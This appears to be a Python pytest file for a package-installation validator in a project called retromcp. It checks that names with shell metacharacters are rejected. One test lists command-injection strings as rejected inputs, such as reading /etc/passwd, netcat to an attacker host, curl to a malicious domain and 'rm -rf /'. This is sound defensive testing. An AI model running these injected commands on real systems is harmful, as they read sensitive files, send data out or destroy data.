"""Tests for package name validation in package use cases.

Following TDD approach - testing the validation method behavior.
"""

from unittest.mock import Mock

import pytest

from retromcp.application.package_use_cases import InstallPackagesUseCase
from retromcp.domain.ports import SystemRepository


class TestPackageNameValidation:
    """Test package name validation for security compliance."""

    def setup_method(self):
        """Set up test fixtures."""
        self.mock_system_repo = Mock(spec=SystemRepository)
        self.use_case = InstallPackagesUseCase(self.mock_system_repo)

    def test_validate_package_name_accepts_valid_alphanumeric_names(self):
        """Test that valid alphanumeric package names are accepted."""
        valid_names = [
            "vim",
            "htop",
            "git",
            "python3",
            "nodejs",
            "mysql8",
            "test123",
            "ABC",
            "Package1",
        ]

        for name in valid_names:
            # Should not raise any exception
            self.use_case._validate_package_name(name)

    def test_validate_package_name_accepts_names_with_hyphens(self):
        """Test that package names with hyphens are accepted."""
        valid_names = [
            "mysql-server",
            "node-js",
            "python3-pip",
            "lib-ssl-dev",
            "build-essential",
            "a-b-c-d",
            "package-with-many-hyphens",
        ]

        for name in valid_names:
            # Should not raise any exception
            self.use_case._validate_package_name(name)

    def test_validate_package_name_accepts_names_with_underscores(self):
        """Test that package names with underscores are accepted."""
        valid_names = [
            "python_package",
            "lib_ssl",
            "test_package",
            "a_b_c_d",
            "package_with_many_underscores",
            "mixed_package123",
        ]

        for name in valid_names:
            # Should not raise any exception
            self.use_case._validate_package_name(name)

    def test_validate_package_name_accepts_mixed_valid_characters(self):
        """Test that package names with mixed valid characters are accepted."""
        valid_names = [
            "python3-dev",
            "lib_ssl-dev",
            "test-package_123",
            "mixed_123-package",
            "a1b2_c3-d4",
        ]

        for name in valid_names:
            # Should not raise any exception
            self.use_case._validate_package_name(name)

    def test_validate_package_name_rejects_empty_string(self):
        """Test that empty package names are rejected."""
        with pytest.raises(
            ValueError, match="Package name must be between 1 and 100 characters"
        ):
            self.use_case._validate_package_name("")

    def test_validate_package_name_rejects_overly_long_names(self):
        """Test that package names longer than 100 characters are rejected."""
        long_name = "a" * 101  # 101 characters

        with pytest.raises(
            ValueError, match="Package name must be between 1 and 100 characters"
        ):
            self.use_case._validate_package_name(long_name)

    def test_validate_package_name_accepts_exactly_100_characters(self):
        """Test that package names with exactly 100 characters are accepted."""
        exactly_100_chars = "a" * 100  # Exactly 100 characters

        # Should not raise any exception
        self.use_case._validate_package_name(exactly_100_chars)

    def test_validate_package_name_rejects_special_characters(self):
        """Test that package names with special characters are rejected."""
        invalid_names = [
            "package@domain",
            "package!test",
            "package#hash",
            "package%percent",
            "package^caret",
            "package*star",
            "package+plus",
            "package=equals",
            "package~tilde",
            "package space",
            "package\ttab",
            "package\nnewline",
        ]

        for name in invalid_names:
            with pytest.raises(ValueError, match="Invalid package name"):
                self.use_case._validate_package_name(name)

    def test_validate_package_name_rejects_dangerous_shell_characters(self):
        """Test that package names with shell injection characters are rejected."""
        # Names that get caught by dangerous character check (now checked before alphanumeric)
        dangerous_names = [
            "package123;",
            "package123&",
            "package123|",
            "package123$",
            "package123`",
            "package123(",
            "package123)",
            "package123{",
            "package123}",
            "package123[",
            "package123]",
            "package123<",
            "package123>",
            "package123\\",
            "package123/",
        ]

        for name in dangerous_names:
            with pytest.raises(
                ValueError, match="Package name contains dangerous character"
            ):
                self.use_case._validate_package_name(name)

    def test_validate_package_name_error_messages_include_package_name(self):
        """Test that error messages include the problematic package name for debugging."""
        # Test invalid character error message
        with pytest.raises(ValueError, match="Invalid package name: test@domain"):
            self.use_case._validate_package_name("test@domain")

        # Test dangerous character error message
        with pytest.raises(
            ValueError,
            match="Package name contains dangerous character ';': package123;",
        ):
            self.use_case._validate_package_name("package123;")

        # Test length error message (now checked first)
        long_name = "a" * 101
        with pytest.raises(
            ValueError,
            match="Package name must be between 1 and 100 characters: " + long_name,
        ):
            self.use_case._validate_package_name(long_name)

    def test_validate_package_name_checks_each_dangerous_character_individually(self):
        """Test that each dangerous character is properly detected."""
        import re

        dangerous_chars = [
            ";",
            "&",
            "|",
            "$",
            "`",
            "(",
            ")",
            "{",
            "}",
            "[",
            "]",
            "<",
            ">",
            "\\",
            "/",
        ]

        for char in dangerous_chars:
            test_name = f"package123{char}"
            # Use re.escape to properly escape regex special characters
            escaped_pattern = re.escape(
                f"Package name contains dangerous character '{char}': {test_name}"
            )
            with pytest.raises(ValueError, match=escaped_pattern):
                self.use_case._validate_package_name(test_name)

    def test_validate_package_name_security_prevents_command_injection(self):
        """Test that validation prevents potential command injection attacks."""
        injection_attempts = [
            "; cat /etc/passwd",
            "&& curl malicious.com",
            "| nc attacker.com 4444",
            "$(cat /etc/hosts)",
            "`cat sensitive.file`",
            "../../../etc/passwd",
            "package > /dev/null",
            "package < /etc/passwd",
            "package \\ && rm -rf /",
        ]

        for attempt in injection_attempts:
            with pytest.raises(ValueError):
                self.use_case._validate_package_name(attempt)

    def test_validate_package_name_edge_cases(self):
        """Test edge cases for package name validation."""
        # Single character names
        self.use_case._validate_package_name("a")
        self.use_case._validate_package_name("1")

        # Names starting/ending with valid special chars
        self.use_case._validate_package_name("-package")
        self.use_case._validate_package_name("package-")
        self.use_case._validate_package_name("_package")
        self.use_case._validate_package_name("package_")

        # Multiple consecutive special chars
        self.use_case._validate_package_name("package--test")
        self.use_case._validate_package_name("package__test")
        self.use_case._validate_package_name("package-_-test")

    def test_validate_package_name_preserves_case_sensitivity(self):
        """Test that package name validation preserves case sensitivity."""
        case_sensitive_names = [
            "Package",
            "PACKAGE",
            "pAcKaGe",
            "MyPackage",
            "libSSL",
            "MySQL-Server",
        ]

        for name in case_sensitive_names:
            # Should not raise any exception
            self.use_case._validate_package_name(name)
